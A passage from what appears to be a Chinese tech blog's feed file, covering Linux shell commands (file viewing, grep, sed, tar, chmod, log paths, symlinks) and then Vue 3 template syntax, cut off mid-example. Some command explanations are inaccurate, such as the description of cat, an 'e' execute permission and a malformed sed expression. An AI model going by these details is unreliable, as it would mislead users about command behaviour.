class="hljs-built_in">shift</span>+：调起输入框）（没有内容更改）<br></code></pre></td></tr></table></figure><h4 id="文件内容查看"><a href="#文件内容查看" class="headerlink" title="文件内容查看"></a>文件内容查看</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> a.java查看a.java文件的最后一页内容；<br>more a.java从第一页开始查看a.java文件内容，按回车键一行一行进行查看，<br>                    按空格键一页一页进行查看，q退出；<br>less a.java从第一页开始查看a.java文件内容，按回车键一行一行的看，<br>                    按空格键一页一页的看，支持使用PageDown和PageUp翻页，q退出；<br></code></pre></td></tr></table></figure><h4 id="实时查看文件"><a href="#实时查看文件" class="headerlink" title="实时查看文件"></a>实时查看文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">head</span> a.java查看a.java文件的前10行内容；<br><span class="hljs-built_in">tail</span> -f a.java查看a.java文件的后10行内容；<br><span class="hljs-built_in">head</span> -n 7 a.java查看a.java文件的前7行内容；<br><span class="hljs-built_in">tail</span> -n 7 a.java查看a.java文件的后7行内容；<br></code></pre></td></tr></table></figure><h4 id="文件内部搜索指定内容"><a href="#文件内部搜索指定内容" class="headerlink" title="文件内部搜索指定内容"></a>文件内部搜索指定内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep under 123.txt在123.txt文件中搜索under字符串，大小写敏感，显示行；<br>grep -n under 123.txt在123.txt文件中搜索under字符串，大小写敏感，显示行及行号；<br>grep -v under 123.txt在123.txt文件中搜索under字符串，大小写敏感，显示没搜索到的行；<br>grep -i under 123.txt在123.txt文件中搜索under字符串，忽略大小写，显示行；<br>grep -ni under 123.txt在123.txt文件中搜索under字符串，忽略大小写，显示行及行号；<br></code></pre></td></tr></table></figure><h4 id="替换文件内容"><a href="#替换文件内容" class="headerlink" title="替换文件内容"></a>替换文件内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;s/Jack/me/g/&#x27;</span> replace.java     全文将Jack替换为me(g是全部替换,不加只替换首个)<br>sed -i <span class="hljs-string">&#x27;/^ *$/d&#x27;</span> replace.java          删除replace.java中的空格(d是删除)<br>sed -i <span class="hljs-string">&#x27;/Interger/d&#x27;</span> replace.java      删除包含Interger的行(d是删除)<br></code></pre></td></tr></table></figure><h4 id="管道操作符"><a href="#管道操作符" class="headerlink" title="管道操作符 [ | ]"></a>管道操作符 [ | ]</h4><p>可将指令连起来，前一个指令的输出作为后一个指令的输入</p><ul><li>只处理前一个命令的正确输出，不处理错误输出</li><li>右边的命令必须能接受标准输入流，否则传递过程中数据将被丢弃</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef | grep tomcat        查找tomcat进程信息<br></code></pre></td></tr></table></figure><h2 id="4-打印输出"><a href="#4-打印输出" class="headerlink" title="4. 打印输出"></a>4. 打印输出</h2><h4 id="echo-基本操作"><a href="#echo-基本操作" class="headerlink" title="echo 基本操作"></a>echo 基本操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;helloworld&quot;</span>           打印 helloworld<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">date</span>`                 打印当前日期, 注意该命令中的不是单引号, 而是[~]键下的符号<br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;hello\nworld&quot;</span>      表示输出不换行，该命令会直接打印 hello\nworld<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;hello\nworld&quot;</span>      对转义字符进行处理，该命令会换行打印 world<br></code></pre></td></tr></table></figure><h4 id="echo-重定向"><a href="#echo-重定向" class="headerlink" title="echo 重定向"></a>echo 重定向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; a.txt          将 “123” 覆盖到 a.txt 文件中<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt;&gt; a.txt         将 “123” 追加到文件后<br></code></pre></td></tr></table></figure><h2 id="5-压缩和解压缩"><a href="#5-压缩和解压缩" class="headerlink" title="5. 压缩和解压缩"></a>5. 压缩和解压缩</h2><h4 id="tar-命令"><a href="#tar-命令" class="headerlink" title="tar 命令"></a>tar 命令</h4><p> <img src="/../blog-assets/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b9c15842223742d58e62b8912548a4d5.png" alt="img"> </p><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -cvf start.tar a.java b.java//将当前目录下a.java、b.java打包<br>tar -cvf start.tar ./*//将当前目录下的所欲文件打包压缩成haha.tar文件<br><br>tar -zcvf start.tar.gz a.java b.java//将当前目录下a.java、b.java打包<br>tar -zcvf start.tar.gz ./*//将当前目录下的所欲文件打包压缩成start.tar.gz文件<br></code></pre></td></tr></table></figure><h4 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf start.tar//解压start.tar压缩包，到当前文件夹下；<br>tar -xvf start.tar -C usr/local //（C为大写，中间无空格）<br>//解压start.tar压缩包，到/usr/local目录下；<br><br>tar -zxvf start.tar.gz//解压start.tar.gz压缩包，到当前文件夹下；<br>tar -zxvf start.tar.gz -C usr/local //（C为大写，中间无空格）<br>//解压start.tar.gz压缩包，到/usr/local目录下；<br></code></pre></td></tr></table></figure><h2 id="6-文件赋权指令"><a href="#6-文件赋权指令" class="headerlink" title="6. 文件赋权指令"></a>6. 文件赋权指令</h2><h4 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h4><p>使用 <code>ll</code> 命令查看文件权限信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-8-8-centos bbb]<span class="hljs-comment"># ll</span><br>-rw-r--r-- 1 root root  34942 Jan 19  2018 bootstrap.jar<br></code></pre></td></tr></table></figure><p>这里解释以下前10位 <code>-rw-r--r--</code> ：</p><ul><li>首位代表文件类型：目录为 <code>d</code>, 文件为 <code>-</code></li></ul><p>后面的三个三元组即为该文件权限：</p><ul><li>前三位：当前用户（user）的文件权限</li><li>中三位：当前组（group）的其他用户的文件权限</li><li>后三位：其他用户（other）的文件权限</li></ul><blockquote><p><code>r</code> ：文件可被读</p><p><code>w</code> ：文件可被写</p><p><code>e</code> ：文件可被执行（如果它是可执行文件的话）</p><p><code>-</code> ：表示无权限</p><p>其中，以上符号也可以用数字代替</p><p><code>r</code> ——– <code>4</code></p><p><code>w</code> ——– <code>2</code> </p><p><code>x</code> ——– <code>1</code></p><p><code>-</code> ——– <code>0</code> </p></blockquote><p>当搞清楚上面的符号表示的含义之后，以下常见权限就很容易明白了：</p><p><code>-rw-------</code> (<em><strong>600</strong></em>)  只有所有者才有读和写的权限</p><p><code>-rw-r--r--</code> (<em><strong>644</strong></em>)  只有所有者才有读和写的权限，组群和其他人只有读的权限</p><p><code>-rwx------</code> (<em><strong>700</strong></em>)  只有所有者才有读，写，执行的权限</p><p><code>-rwxr-xr-x</code> (<em><strong>755</strong></em>)  只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限</p><p><code>-rwx--x--x</code> (<em><strong>711</strong></em>)  只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限</p><p><code>-rw-rw-rw-</code> (<em><strong>666</strong></em>)  每个人都有读写的权限</p><p><code>-rwxrwxrwx</code> (<em><strong>777</strong></em>)  每个人都有读写和执行的权限</p><h4 id="chmod-命令"><a href="#chmod-命令" class="headerlink" title="chmod 命令"></a>chmod 命令</h4><p>操作选项：</p><ul><li><code>+</code> ：添加权限</li><li><code>-</code> ：删除权限</li><li><code>=</code> ：设置为唯一权限</li></ul><p>操作对象：</p><ul><li><code>u</code> ：所有者 user</li><li><code>g</code> ：所有者所在组 group</li><li><code>o</code> ：除 <code>u</code> 和 <code>g</code> 以外的其他人 other</li><li><code>a</code> ：所有人 all</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> g+w test.txt       给 group 用户增加写权限<br><span class="hljs-built_in">chmod</span> go-x a.sh          给 group 和 other 用户删除可执行权限<br><span class="hljs-built_in">chmod</span> 777 test.txt       放开该文件所有权限<br></code></pre></td></tr></table></figure><p>如果想要一次性修改某个目录下所有文件的权限，需使用 <code>-R</code> 做递归处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> -R 777 /home/user  放开/home/user 目录下所有文件的权限<br></code></pre></td></tr></table></figure><h2 id="7-系统日志位置"><a href="#7-系统日志位置" class="headerlink" title="7. 系统日志位置"></a>7. 系统日志位置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/redhat-release查看操作系统版本<br>/var/log/message系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一<br>/var/log/message系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一 <br>/var/log/secure与安全相关的日志信息 <br>/var/log/maillog与邮件相关的日志信息 <br>/var/log/cron与定时任务相关的日志信息 <br>/var/log/spooler与UUCP和news设备相关的日志信息 <br>/var/log/boot.log守护进程启动和停止相关的日志消息 <br></code></pre></td></tr></table></figure><h2 id="8-创建与删除软连接"><a href="#8-创建与删除软连接" class="headerlink" title="8. 创建与删除软连接"></a>8. 创建与删除软连接</h2><h4 id="创建软连接"><a href="#创建软连接" class="headerlink" title="创建软连接"></a>创建软连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /usr/local/app /data  创建 /usr/local/app 目录与 /data 目录的软连接<br></code></pre></td></tr></table></figure><h4 id="删除软连接"><a href="#删除软连接" class="headerlink" title="删除软连接"></a>删除软连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /data                删除软连接, 最后不能加/, 加上表示删除文件夹<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue 3 基础</title>
    <link href="/2022/06/14/Vue%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/14/Vue%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Vue.js 是一个基于 <strong>MVVM</strong> 架构的渐进式框架，可以动态构建用户界面，解耦视图和数据</p><ul><li>官方 Doc ： <a href="https://v3.cn.vuejs.org/guide/introduction.html"> Vue.js </a></li></ul></blockquote><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h2><ul><li>M（model）：构成页面内容的模型数据</li><li>V（view）：展示数据的页面</li><li>VM（view model）：将 <code>model</code> 中的数据解析到 <code>view</code> 中</li></ul><p>开发者只需关心页面和数据的构成，无需关心页面和数据的状态关系，几乎不用操作 <code>DOM</code> 就可以完成页面和数据的交换</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><ol><li>获取 <code>Vue</code> 核心库的 js 文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install vue<br></code></pre></td></tr></table></figure><ol start="2"><li>在页面中引入 <code>Vue</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vue.global.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、Vue-3-模板语法"><a href="#二、Vue-3-模板语法" class="headerlink" title="二、Vue 3 模板语法"></a>二、Vue 3 模板语法</h1><h2 id="Vue-插值语法"><a href="#Vue-插值语法" class="headerlink" title="Vue 插值语法"></a>Vue 插值语法</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="mustache"><a href="#mustache" class="headerlink" title="mustache"></a><strong>mustache</strong></h3><p>使用 <code>mustache</code> 语法把 data、method 中的文本数据插入到 HTML 代码中，形如 <code>&#123;&#123; exp &#125;&#125;</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        &#123;&#123; name &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//mustache语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> app = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;hello world&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#app&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><p>该指令后不需要跟表达式，表示元素和组件至渲染一次，不会随着数据改变而改变</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vonce&quot;</span> <span class="hljs-attr">v-once</span>&gt;</span><br>    &#123;&#123; name &#125;&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;change&quot;</span>&gt;</span>切换<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><p>有时，我们从服务器请求到的数据是html代码，这时候用mustache语法会把html代码输出，但我们希望得到的是按照html格式来进行解析的内容，此时要用到 <code>v-html</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vhtml&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//v-html 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vhtml = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;&lt;p&gt;v-html test&lt;/p&gt;&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#vhtml&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-pre"><a href="#v-pre" class="headerlink" title="v-pre"></a>v-pre</h3><p>类似转义符，将内容原封不动的显示出来，不做任何解析</p><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><p>网页中的属性、网址等，大多是从服务器请求得来的，这些数据暂存在 vue 中，在 HTML 中利用 <code>v-bind</code> 来实现动态绑定，该指令有一个语法糖，只留下一个 <code>:</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vbind&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;&#123;active : isActive, line : isLine&#125;&quot;</span>&gt;</span><br>            &#123;&#123; name &#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//v-bind 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vhtml = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;&lt;p&gt;v-html test&lt;/p&gt;&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#vbind&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><p>前端开发需要经常与用户进行交互，此时就需要监听用户事件，比如点击、拖拽等。在Vue中，我们使用 <code>v-on</code> 来监听事件，该指令同样有一个语法糖，直接使用 <code>@</code> 绑定属性，当事件监听调用的方法没有参数时，可直接写方法名，不用加 <code>()</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;von&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;reversemsg&quot;</span>&gt;</span>反转字符串<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//v-on 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> von = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;12345678&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">reversemsg</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#von&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-on-修饰符"><a href="#v-on-修饰符" class="headerlink" title="v-on 修饰符"></a>v-on 修饰符</h3><ul><li>stop：点击某一块区域时，不想让其中其他的子区域也触发</li><li>prevent：防止表单进行提交，阻止事件的默认行为</li><li>once：事件只触发一次</li><li>keyup&#x2F;keydown：监听某个按键的录入</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;von&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;reversemsg&quot;</span>&gt;</span>反转字符串<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-on:keyup.enter</span>=<span class="hljs-string">&quot;keyclick&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> von = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;12345678&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">reversemsg</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">keyclick</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#von&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="条件渲染与列表渲染"><a href="#条件渲染与列表渲染" class="headerlink" title="条件渲染与列表渲染"></a>条件渲染与列表渲染</h2><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><p>使用 <code>v-if</code> 、 <code>v-else</code> 、<code>v-else-if</code> 做条件判断</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 